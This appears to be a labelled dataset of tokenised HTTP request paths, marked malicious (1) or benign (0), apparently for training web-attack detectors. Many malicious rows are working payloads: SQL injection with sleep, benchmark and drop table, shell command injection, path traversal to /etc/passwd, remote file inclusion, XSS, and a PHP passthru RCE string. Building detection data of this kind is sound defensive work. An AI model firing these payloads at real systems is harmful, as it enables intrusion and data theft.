request	label
/ string / modo = registro & login = jozef & password = ve9derse & nombre = tahiel & apellidos = ortiz + narvarte & email = lemontier @ viajesnacionales . kp & dni = 70721027y & direccion = calle + virgen + de + la + hoz ,  + 123 + 4-b & ciudad = borrass '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' % & cp = 44564 & provincia = zaragoza & ntc = 7002955624204925 & b1 = registrar 	1
/ string / strings / parameters = 1 '  |  |  ( select  ' nzjz '  where 3539 = 3539 and 8148 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- 	1
/ examples / jsp / error / pmwiki . php ? globals [ farmd ]  =  / etc / passwd \ x00 	1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo jdgurs )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ javascript / x . c 	0
/ string / strings / parameters = 1 %  '  )  )  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 and  (  (  '  %  '  =  ' 	1
/ string / id = 1 & nombre = vino + rioja & precio = 85 & cantidad =  |  & b1 = aadir + al + carrito 	1
/ 1906005001 / 	0
/ package-remoteinstall / 	0
/ string / strings / parameters = ( case when 2646 = 8520 then 2646 else null end ) 	1
"/ en-us / oie504mr . x ?  < meta http-equiv = set-cookie content =  "" testtpby = 7052 ""  > "	1
/ win323 / 	0
/ string / modo = entrar & login = aiden & pwd = aceitn & remember = on & b1 = entrar 	0
/ string / strings / parameters = mckenney 	0
/ string / strings / parameters = '   str =  $  ( echo fplfhr )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ 000124501 / 	0
/ string / modo = registro & login = eward & password =  $ despumar & nombre = rory & apellidos = naredo + reggiardo & email = korey_molina @ juguetespersonales . gob & dni = 37068097d & direccion = calle + fausto + fraile + 0 +  & ciudad = aracena & cp = 17256 & provincia = palencia & ntc = 3362439041972349 & b1 = registrar 	0
/ 20040428easoapbox / 	0
/ string / strings / parameters = calle arins 87 4 ? e 	0
"/ string / strings / parameters = 1 %  ""  ""  )  ; select count (  *  )  from generate_series ( 1 , 5000000 )  and  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo kjbkaz )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1 	1
/ javascript / cnf . sfish 	0
/ string / strings / parameters = echo $ ifsovtgks $  (  ( 3 + 77 )  )  $  ( echo $ ifsovtgks ) ovtgks /  / 	1
/ corporatecontacts / 	0
/ string / modo = registro & login = clarita & password = 2e720lon7r & nombre = quirico & apellidos = martnez & email = goodier_igus @ catanoticias . sd & dni = 37035771k & direccion = avenida + casado + del + alisal ,  + 70 +  & ciudad = caspuea / s & cp = 42311 & provincia = tarragona & ntc = 9017290902673113 & b1 = registrar 	1
/ string / str =  $  ( echo rpjjib )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ string / strings / parameters = v2e2udo 	0
/ string / strings / parameters = < xmp >  <  %  <  / xmp >  < img alt =  '  %  >  <  / xmp >  < img src = xx : x onerror = alert ( 1 )  /  /  '  >  < script > x =  '  <  %  '  <  / script >   %  >  / alert ( 2 )  <  / script > xxx < style >  *  [  '  <  !  --  '  ]  {  }  <  / style >  --  >  {  }  *  { color : red }  <  / style > 	1
/ 163579 / 	0
/ string / modo = registro & login = devy & password = ajaraca & nombre = ermelindo & apellidos = almirall + pahisa & email = leza . vanbrugh @ ajuntamentbarcelona2-0 . gq & dni = 61089913g & direccion = alvarez + 35 +  & ciudad = corulln & cp = 42250 & provincia = valencia & ntc = 4870628613160341 & b1 = registrar 	0
/ brew24 / 	0
/ 050125 / 	0
/ 047417 / 	0
/ string / strings / parameters = | echo $ ifsessswt $  (  ( 28 + 90 )  )  $  ( echo $ ifsessswt ) essswt | 	1
/ index_751 / 	0
"/ top . php ? stuff =  "" ping \ x0b-w \ x0b10000 \ x0b-n \ x0b1 \ x0b1 . 2 . 3 . 4 & rem \ x0b "	1
"/ 0qhcnefz . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 105936 / 	0
"/ string / strings / parameters = & lt ; style & gt ; li  { list-style-image &  # 58 ;  url (  \  "" javascript &  # 058 ; alert (  ' xss '  )  \  ""  )  ;  }  & lt ;  / style & gt ;  & lt ; ul & gt ;  & lt ; li & gt ; xss "	1
/ gwshare / 	0
/ dayinrock / 	0
/ string / strings / parameters = arndiga 	0
/ employee_tools / 	0
/ antiquetruckswallpaper / 	0
/ string / strings / parameters = masahiro 	0
/ string / strings / parameters = ebony 	0
/ disgen 8 / 	0
/ string / strings / parameters = & lt ;  ?  tnn96  ?  & gt ; 	1
/ 110071 / 	0
/ cgi / testcgi . exe 	1
"/ xfkun1ku . asp ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ who ' s-connecting / 	1
/ 332-column / 	0
/ q63385238 	0
/ mzm5ntiz / 	0
/ string / strings / parameters = 1 )  )  union all select null , null , null , null , null , null # 	1
/ lib / images / media_link_displaylnk . png 	0
/ string / strings / parameters = echo ncmpjp $  (  ( 69 + 98 )  )  $  ( echo ncmpjp ) ncmpjp \ 	1
/ string / strings / parameters = 1 procedure analyse ( extractvalue ( 9255 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x52515a50 )  )  )  )  )  , 1 ) 	1
/ examples / jsp / colors / index . php ? string =  ' 	1
/ phprocketaddin /  ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini 	1
/ string / strings / parameters = mgi4a 	0
/ string / strings / parameters = '  |  | echo townyh $  (  ( 45 + 79 )  )  $  ( echo townyh ) townyh 	1
/ wusf-fm / 	0
"/ string / strings / parameters = ""  ;  str =  $  ( echo tlxejk )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ script / menu / menuprincipal . php ? path_inc = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ? 	1
/ javascript / head . old 	0
/ examples / jsp / colors / mrtg . cgi ? cfg =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / modo = registro & login = zalman & password =  * diettico & nombre =  '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & apellidos = fabrs + bueso & email = riegert_tao-lin @ sanchezquesada . ke & dni = 11051114m & direccion = avenida + san + mames ,  + 25 ,  +  & ciudad = carriches & cp = 50366 & provincia = guadalajara & ntc = 7998962855410697 & b1 = registrar 	1
/ string / strings / parameters = 17rdiflo4a 	0
/ annual_reports / 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo zyjhac )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  # 	1
/ string / id = 1 & nombre = queso + manchego & precio = 39 & cantidad = 0 & b1 = aadir + al + carrito 	0
/ sfooter / 	0
/ decorative-wall / 	0
/ string / strings / parameters = 4920792852511855 	0
/ string / strings / parameters = dieasl_yannatos @ vilainstal . coop 	0
/ prismdump_20001122 / 	0
/ string / strings / parameters = dennis 	0
/ javascript / arch . xls 	0
/ string / strings / parameters = brenden 	0
/ string / strings / parameters = 40592671v 	0
/ string / strings / parameters = ventura motn 	0
/ scripts / calendar . php ? month =  '  union select 1 , 1 ,  ' 1331908724 '  ,  ' calendarix_month_sql_injection . nasl '  , 1  # 	1
/ string / strings / parameters = calle cortafell ,  74 	0
/ string / modo = registro & login = cannatar & password = 7i78o02 & nombre = sofanor & apellidos = cortadel + montori & email = mckechnie @ beatrizbalado . sh & dni = 50674086a & direccion = calle + los + vidrieros ,  + 93 ,  + 4-d & ciudad = regueras ,  + las & cp = 24221	1
"/ string / strings / parameters = ""  & echo qdnjwl $  (  ( 73 + 61 )  )  $  ( echo qdnjwl ) qdnjwl | "	1
/ 20030604-1 / 	0
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  +  |  |  + echo + db + 00 + 00 + 00 + 00 + 10 + 00 + 00 + 20 + 00 + 00 + 00 + 00 + 10 + 00 + 00 + 10 + 00 + 00 + 00 + 00 + 00 + 00 + 10 + 00 + 00 +  +  >  > esbq "	1
/ string / strings / parameters = 55z8do 	0
/ string / strings / parameters = -7324 )  or make_set ( 8486 = 6544 , 6544 ) 	1
/ string / modo = registro & login = pistilli & password = pervertimiento & nombre = delfo & apellidos = berzoni + arzaluz & email = starkey @ mcfly . kg & dni = 29973823q & direccion = calle + alacant + 165 + 6-b & ciudad = cabezn + de + cameros & cp = 28691 & provincia = l * a +  ? r * ioja & ntc = 7673189630192545 & b1 = registrar 	1
/ include / init . inc . php ? g_path = xxpathxx 	1
/ j4oqyvga . pl ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / sponsor . sql 	0
/ string / modo = registro & login = defalco & password = botonesset-cookie :  + tamper = 1041264011025374727 & nombre = suyai & apellidos = rbago + patraca & email = ghenaiem_berlin @ hipotecascom . je & dni = 24778234n & direccion = c /  + la + salpa + 104 ,  +  & ciudad = moral + de + la + reina & cp = 10334 & provincia = burgos & ntc = 5823821605242067 & b1 = registrar 	1
/ 5zp0f2khgc / 	0
/ bzuf9ozq . jsp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 000024135 / 	0
/ 115957 / 	0
/ e9rx3ya4 . jspa ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ a0imiuf1 . php3 ?  < script > document . cookie =  "" testxqrn = 4654 ;  ""  <  / script > "	1
/ string / strings / parameters = broussar 	0
/ admin / addentry . php ? phpbb_root_path = xxpathxx ? 	1
/ string / id = 3 & nombre = jamn + ibrico & precio = 85 & cantidad = 25 & b1 = aadir + al + carrito 	0
/ irnetv0 / 	0
/ string / modo = entrar & login = ro +  ? semari & pwd = 1eb5l0e & remember = off & b1 = entrar 	1
/ main . php ? stuff = ping -w 8000 -n 1 1 . 2 . 3 . 4 & rem 	0
/ cacti / print . php ? what = article & id =  ' 	1
/ nuclear_arms / 	0
/ ted_kennedy / 	0
/ string / strings / parameters = 38036492n 	0
/ skin_lyrics / 	0
"/ string / errormsg = paros ""  style =  "" background : url ( javascript : alert (  ' paros '  )  ) "	1
/ phpmyadmin / www / delivery / ac . php ? bannerid = -1331904367 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_oyo3tg_8 ]  )  )  ; die ;  /  * 	1
/ wsplzzxfev / 	0
/ string / strings / parameters = '   str =  $  ( echo nzalsy )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ string / modo = registro & login = sherri & password = adj9d8cat0r55 & nombre = amaru & apellidos = gilabert & email = chimento @ fuzzy . bb & dni = 66365789w & direccion = plaza + doctor + quemada + 88 + 8-h & ciudad = castrocalbn & cp = 19268 & provincia = asturias & ntc = 210713793422155a & b1 = registrar 	1
/ string / strings / parameters = aldebaran 8 	0
/ string / modo = registro & login = eiko & password = desaprovedhosa & nombre = guy & apellidos = peruyero + danis & email = sundbery-vonic @ castigado . tf & dni = 61857027e & direccion = c /  + jose + maria + pereda ,  + 49 +  & ciudad = chodes & cpa = 12319 & provincia = albacete & ntc = 8340633556666736 & b1 = registrar 	1
/ string / modo = insertar & precio = 4210 & b1 = pasar + por + caja 	0
/ string / strings / parameters = thalasso . chappell @ titulosoficiales . jp 	0
"/ string / modo = registro & login = vasiliad & password = tiqu73m77uis & nombre = virma & apellidos = catolino + florensa & email = ridges @ fotoseroticas . com . cx & dni = 67499126z < script > alert (  "" paros ""  )  ;  <  / script >  & direccion = plza .  + mayor ,  + 166 ,  +  & ciudad = camarias & cp = 26240 & provincia = almera & ntc = 4709387607686346 & b1 = registrar "	1
/ string / strings / parameters = '  | echo nuzdzt $  (  ( 76 + 71 )  )  $  ( echo nuzdzt ) nuzdzt | 	1
/ string / strings / parameters = '  & echo $ ifshxzbrd $  (  ( 3 + 30 )  )  $  ( echo $ ifshxzbrd ) hxzbrd | 	1
/ javascript / makefile 	0
/ love song cd / 	0
/ string / strings / parameters = disipar 	0
/ javascript / cisco . class 	0
/ string / strings / parameters = rodern 	0
/ string / strings / parameters = gilburt 	0
"/ d44uk9h2 . php ?  < script > document . cookie =  "" testmybc = 2088 ;  ""  <  / script > "	1
/ dick_parsons / 	0
/ string / strings / parameters = afiligr * anado 	0
/ string / strings / parameters = 1 procedure analyse ( extractvalue ( 9255 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x52515a50 )  )  )  )  )  , 1 )  --  wvjy 	1
"/ string / strings / parameters = 1 ""  ""  )  )  ; select  ( case when  ( 4690 = 4373 )  then 4690 else 1 /  ( select 0 )  end )  -- "	1
/ schedule_organizer / 	0
/ easyregex / 	0
/ javascript / certs . vb 	0
/ cgi-bin / dbmlparser . exe 	1
/ string / strings / parameters = |   [  8 -ne  $  ( echo pefrrd  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ string / modo = insertar & precio = 7974 & b1 = pasar + por + caja 	0
/ string / id = 2 & nombre = jamn '  + ibric- ' o & precio = 85 & cantidad = 14 & b1 = aadir + al + carrito 	1
/ en-us / account / admin / admin . php ? sid =  ' 	1
/ javascript / pr0n . cs 	0
/ javascript / ie . pdf 	0
/ string / strings / parameters = steinbach @ ballobar . com . tf 	0
/ helplite / 	0
/ string / strings / parameters = 1 '  )  )  or 8315 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  (  (  ' bmbt '  =  ' bmbt 	1
/ color-it / 	0
/ cd-duplicators / 	0
/ nmoldyn / 	0
/ main . php ? frm_daynight = day & frm_passwd =  & frm_referer = http :  /  / 192 . 168 . 26 . 202 / main . php ? stuff = 1861731255 & frm_user =  & scr_height =  & scr_width = q81848235 	1
"/ examples / jsp / error / webappmon . exe ? ins = nowait & act = natping & sel =  "" 255 . 255 . 255 . 255  &  id &  "" "	1
/ 5052648 / 	0
"/ 169okeyj . x ?  < script > document . cookie =  "" testxeoi = 3573 ;  ""  <  / script > "	1
/ bangkok babes-locket n '  chain  ( 2002 )  / 	1
/ television_ / 	0
/ string / strings / parameters = oziel 	0
/ string / strings / parameters = ; echo nhfbai $  (  ( 91 + 84 )  )  $  ( echo nhfbai ) nhfbai ' 	1
/ bdplus / 	0
/ string / strings / parameters = scriptalert ( 1 )  / script 	1
/ string / strings / parameters = < svg / onload = alert ( 1 ) 	1
/ javascript / decoder . part 	0
/ smabacus / 	0
"/ main . php ? logout =  "" rm q61955456 & rem "	1
/ javascript / pipermail . vb 	0
/ class-pangolayoutiter / 	0
/ string / strings / parameters = 4135 	0
/ 114983 / 	0
/ javascript / bb . error 	0
/ 042734 / 	0
/ string / strings / parameters = ; echo npxsto $  (  ( 33 + 52 )  )  $  ( echo npxsto ) npxsto /  / 	1
/ shabbychicbarstools / 	0
/ longhouses / 	0
/ string / strings / parameters = 1 '  +  ( select  ' idmr '  where 5029 = 5029 union all select null , null , null , null , null , null -- 	1
/ string / strings / parameters = 1 )  procedure analyse ( extractvalue ( 9627 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x4b774c75 )  )  )  )  )  , 1 )  # 	1
/ theller / 	0
/ garciasent / 	0
/ ineulande / 	0
/ 293688 / 	0
/ string / modo = insertar & precio = 5741 & b1 =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -- 	1
/ string / strings / parameters = 1 )  where 1880 = 1880 and 8312 = dbms_pipe . receive_message ( chr ( 69 )  |  | chr ( 79 )  |  | chr ( 101 )  |  | chr ( 68 )  , 5 )  -- 	1
/ algernon charles swinburne / 	0
/ string / strings / parameters = '  |   [  9 -ne  $  ( echo lvddnf  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ pdrm7336_large / 	0
/ power-boating_popular / 	0
/ pocketbike_rating / 	0
/ string / strings / parameters = '  & echo $ ifszfqgsy $  (  ( 67 + 86 )  )  $  ( echo $ ifszfqgsy ) zfqgsy 	1
/ string / strings / parameters = rayadillo 	0
"/ string / strings / parameters = 1 %  ""  ""  )  and char ( 111 )  |  | char ( 77 )  |  | char ( 121 )  |  | char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ mostrequested / 	0
/ wb-dell / 	0
/ string / strings / parameters = d5sm7lad7 	0
/ javascript / solve . js 	0
/ string / strings / parameters = 1 '  )  )  as yqcl where 5026 = 5026 rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  -- 	1
"/ string / strings / parameters = 1 ""  ""  )  )  )  union all select null -- "	1
/ game-708 / 	0
"/ 82q7ywa8 . mscgi ?  < script > document . cookie =  "" testpwew = 1315 ;  ""  <  / script > "	1
/ online_ads / 	0
"/ zabbix / frontends / php / locales . php ? download = 1 & langto = 1 & extlang [  ""  . system (  ' chmod + 555 +  / tmp / ldlivpaolb0 ;  '  )  .  ""  ]  = 1 "	1
/ javascript / pkg . tgz 	0
/ string / str =  $  ( echo mkjxcw )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
"/ string / strings / parameters = ""  |   [  6 -ne  $  ( echo zddhyl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  # "	1
"/ yef5f3d5 . jspa ?  < script > document . cookie =  "" testcrcv = 6167 ;  ""  <  / script > "	1
/ javascript / proxy . exe 	1
/ main . php ? stuff =  '  & del q78458992  # 	1
"/ top . php ? stuff =  "" uname  # "	1
/ string / strings / parameters = 05147 	0
/ string / strings / parameters = -4979 '  )  )  or 4493 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  (  (  ' ofgg '  =  ' ofgg 	1
/ preopp-bottom / 	0
/ 061211beajava / 	0
"/ m2fpztty . cgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = & lt ; iframe src = http &  # 58 ;  /  / ha &  # 46 ; ckers &  # 46 ; org / scriptlet &  # 46 ; html & gt ; 	1
"/ string / strings / parameters = |   [  4 -ne  $  ( echo mrdzpj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ 11752698 / 	0
/ cgi-bin / index . php ? p =  ' nessus 	1
/ spaceteam / 	0
/ as_logo / 	0
/ svilengrad / 	0
/ string / strings / parameters = 15318 	0
/ national lampoon ' s van wilder the rise of taj cam kvcd / 	1
"/ string / strings / parameters = >  ""  ""  < div style =  ""  "" background-image :  url ( javascript : document . cookie = true ;  )  ""  ""  > "	1
/ index1440 / 	0
/ string / strings / parameters = dominguez @ comercioenlacalle . hn 	0
/ string / strings / parameters = requa @ alcantarapartners . zw 	0
/ string / strings / parameters = ; echo qpnmnq $  (  ( 33 + 62 )  )  $  ( echo qpnmnq ) qpnmnq 	1
/ javascript / sites . cgi 	0
/ string / strings / parameters = 1 '  )  )  union all select null , null , null , null , null , null -- 	1
